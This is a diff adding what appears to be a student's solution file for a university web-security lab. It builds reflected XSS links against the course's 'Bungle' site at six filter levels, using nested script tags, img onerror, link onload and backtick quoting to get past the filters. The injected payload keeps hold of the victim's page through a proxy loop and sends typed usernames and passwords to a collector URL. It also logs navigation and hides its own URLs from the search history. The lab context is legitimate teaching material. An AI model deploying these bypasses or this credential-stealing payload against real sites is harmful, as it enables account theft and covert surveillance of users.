@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="6d8af58">
+	<title>WebSec 2.2.3</title>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script>
+
+/*
+INTRODUCTION:
+You MAY create your own injection from scratch, but we recommend this template as a starting point.
+This template will help you greatly in building your malicious links for 2.2.3 XSS without too much design work.
+But, you do have to learn how it works.
+If you are unfamiliar with JavaScript, this explanation might help:
+
+This is an HTML file, but the important parts are enclosed in this inline JavaScript script.
+Your goal is to make malicious links to Bungle with various protection levels.
+
+First, you see two functions called payload() and makeLink() defined. 
+We'll come back to them when they are called.
+
+Next, you'll see a warning not to change anything below it. 
+But you do need to know what the below code does.
+
+We next define a variable containing the root page URL for Bungle and another variable with the URL you need to use for spying.
+
+Last, we use JQuery $() to run a function for us when the page has loaded. 
+It is an anonymous function and it selects each of the <h3> tags at the end of the file and turn them into malicious links.
+To do this, it calls the makeLink() function.
+
+So, let's look at what makeLink() does.
+First, it uses a JavaScript feature where you can treat functions like objects and get the code used to define them. 
+We turn the payload() function into a string called payload_string.
+
+Then, depending on the protection level, the switch statement builds a different URL attack.
+The nice thing is that, apart from the warmup, you can re-use the same attack payload function for all the defense levels!
+You just might need to change it slightly to get it to run. 
+Once it is running, it will work against any protection level.
+
+For 2.2.3.2 we have a sample that shows how you can build a malicious link that takes advantage of the XSS vulnerability in Bungle's search page.
+First, we build the URL by concatenating the target base URL, the search page path, and the protection level.
+Then we are specifying what is being searched for with &q=[XSS ATTACK HERE].
+We probably have used characters (like spaces) that are not allowed in a URL in our payload function, so we URL-encode them using the encodeURIComponent() built-in function.
+Also notice that when we add on the closing <script> tag, we break it up to avoid confusing the HTML parser when it reads 2.2.3.html.
+All of this is so that the payload() function will execute inside of Bungle's search result page.
+
+Finally, we can see what the payload() function does.
+
+First it defines a function called proxy()
+Then it calls proxy.
+
+proxy() is the secret to this whole attack design.
+Remember you are on the search page, but want to show the main Bungle page.
+The first thing proxy does is use JQuery to select the <html> parent tag of all other HTML tags on Bungle.
+Then, it makes it invisible.
+Next, it uses JQuery load() to replace every tag inside the <html> tag with the results of a web request.
+In this case, we passed in ./ as the href, so it will give us the root Bungle page.
+JQuery load() can callback to another function once the load is finished, so we callback to another anonymous function which makes everything visible again.
+
+It is at this point that you should take over every button, link, and form on the page to ensure that when the user clicks them, they actually end up calling proxy again.
+Except this time, maybe you will proxy() the search page.
+If you can trap users in this endless loop, you will have persistence.
+Then just add spying code and hide your suspicious URLs.
+*/
+
+// Inject this XSS payload. 
+function payload(attacker) {
+
+    // This function can make it appear that a new page has been loaded
+    // Note that you can proxy the main page, or a search page!
+	function proxy(href, spying_url, first=false) {
+	    // Make all current HTML invisible.
+    	$('html').hide();
+
+    	// overwrites current HTML. Execute a callback function when load has finished.
+    	$('html').load(href, function() {
+
+            // Show new HTML
+            $('html').show();
+
+            // Manage History API
+            // On the first proxy we must replaceState
+            // On subsequent proxies we must push state b/c no new
+            // history entries are added when we proxy to a page
+            if (first) { history.replaceState({href: href}, "", href); }
+            else { history.pushState({href: href}, "", href); }
+            
+            // Popping a hisotry item should not actually re-navigate.
+            // Instead we pretend to navigate via proxy	        
+            window.onpopstate = e => {
+                e.preventDefault();
+                
+                proxy(e.state.href, attacker);
+	        }
+	        
+	        // Notify backend of any page we proxy
+	        let username = $("#logged-in-user");
+	        if(username) username = username.text();
+	        else username = "";
+
+	        let req = $.get("http://127.0.0.1:31337/stolen?event=nav&user="+username+"&url="+encodeURIComponent(window.location));
+	        let callback = () =>  {
+
+                // Track logins/account creation
+                let loginForm = $("#log-in-btn").parent().parent();
+                loginForm.submit(e => {
+                    e.preventDefault(); // Overriding
+
+                    let username = $("#username").val();
+                    let pwd = $("#userpass").val();
+                    let req = $.get("http://127.0.0.1:31337/stolen?event=login&user="+username+"&pass="+pwd);
+                    let callback = () => {
+                        // Manually submit the post request, which steals session cookie
+                        // Then proxy the new page
+                        let req = $.post("./login", {username: username, password:pwd});
+                        let callback = () => {proxy("/", attacker)};
+                        req.error(callback); // Assignment doesn't require us to handle this
+                        req.done(callback);
+                    };
+		    
+		            // Whether or not we fail we must generate the new page
+                    req.error(callback);
+                    req.done(callback);                   
+                });
+
+
+		        // Track logout
+		        let logoutForm = $("#log-out-btn").parent();
+		        logoutForm.submit(e => {
+		            e.preventDefault();
+		            
+		            let username = $("#logged-in-user").text();
+		            let req = $.get("http://127.0.0.1:31337/stolen?event=logout&user="+username);
+		            let callback = () => {
+		                // Continue with actual logout
+			            let req = $.post("/logout");
+			            let callback = () => {proxy("/", attacker)};
+			            req.error(callback);
+		                req.done(callback);
+		            }
+		            req.error(callback);
+		            req.done(callback);
+	            });
+
+                // Stick after searches
+                let searchForm = $("#search-btn").parent();
+                searchForm.submit(e => {
+                    e.preventDefault();
+                    
+                    let query = $("#query").val();
+                    proxy("/search?q="+query, attacker);
+                });
+
+                // Stick after search done
+                let searchAgain = $("#search-again-btn");
+                searchAgain.click(e => {
+                    e.preventDefault();
+
+                    proxy("/", attacker);                
+                });
+
+                // Stick after Bungle link in navbar
+                let navLink = $("#bungle-lnk");
+                navLink.click(e => {
+                    e.preventDefault();
+                    proxy("/", attacker);
+                });
+
+                // Prevent our attack from showing up in search history
+                // And reroute all links to proxy
+                let historyList = $(".history-item");
+                historyList.each( (i, elt) => {
+                    if(decodeURIComponent(elt.href).includes("http://127.0.0.1:31337/stolen")) {
+                        elt.remove();
+                    }
+                    else{
+                        elt.addEventListener("click", e => {
+                            e.preventDefault();
+                            proxy(elt.href, attacker);
+                        });
+                    }
+                });
+            };
+            req.done(callback);
+            req.error(callback);
+        });
+    }
+
+    //Call Proxy
+	proxy('/', attacker, true);
+}
+
+function makeLink(target, attacker, defense) {
+
+    // Encode your payload function as a string 
+    payload_string = payload.toString();
+
+    switch(defense) {
+        case 1:
+            return  "http://bungle-cs461.csl.illinois.edu/multivac/?name=%3Cbr%3E%3Ca%20href=%22http://www.ece.illinois.edu%22%3EClick%20me%3C/a%3E%3C!--";
+        case 2:
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+                encodeURIComponent(
+                    "<script>" +
+                    payload_string + 
+                    ";payload();" + 
+                    "</script" + ">"
+                );
+        case 3:
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+                encodeURIComponent(
+                    "<scrscriptipt>" +
+                    payload_string + 
+                    ";payload();" + 
+                    "</scrscr" + "iptipt" + ">"
+                );
+        case 4:
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+                encodeURIComponent(
+                    "<img src=\"\" onerror=\"" +
+                    payload_string.replace(/\"/g, "'") + 
+                    ";payload();\">"
+                );
+        case 5:
+            // Seems like an oversight, but they don't check for link tags!
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+                encodeURIComponent(
+                    "<link href=\"//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.0.0/css/bootstrap.min.css\" rel=\"stylesheet\" media=\"screen\" onload=\"" +
+                    payload_string.replace(/\"/g, "'") + 
+                    ";payload();\">"
+                );
+        case 6:
+            // Not sure how to do this if they also removed script tags...
+            // Luckily they don't :)
+            // ` is another way to form string literals in JS!
+            return target + "/search?xssdefense=" + (defense-2) + "&q=" + 
+                encodeURIComponent(
+                    "<script>" +
+                    payload_string.replace(/['\"]/g, "`") + 
+                    ";payload();" + 
+                    "</script" + ">"
+                );
+    }
+}
+
+// You MUST not modify anything past this line.
+var target = `http://bungle-cs461.csl.illinois.edu/`;
+var attacker = `http://127.0.0.1:31337/stolen/`;
+
+$(function() {
+    $("#defense1").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 1) + "\">Try The Warmup! 2.2.3.1</a>");
+	$("#defense2").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 2) + "\">Try Bungle! 2.2.3.2 (No Defense)</a>");
+    $("#defense3").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 3) + "\">Try Bungle! 2.2.3.3 (Remove Script)</a>");
+    $("#defense4").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 4) + "\">Try Bungle! 2.2.3.4 (Recursively Remove Script)</a>");
+    $("#defense5").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 5) + "\">Try Bungle! 2.2.3.5 (Recursively Remove Tags)</a>");
+    $("#defense6").html("<a target=\"run\" href=\"" + makeLink(target, attacker, 6) + "\">Try Bungle! 2.2.3.6 (Remove Quote Marks</a>");
+});
+</script>
+</head>
+
+<body>
+    <h3 id="defense1"></h3>
+    <h3 id="defense2"></h3>
+    <h3 id="defense3"></h3>
+    <h3 id="defense4"></h3>
+    <h3 id="defense5"></h3>
+    <h3 id="defense6"></h3>
+</body>
+</html>
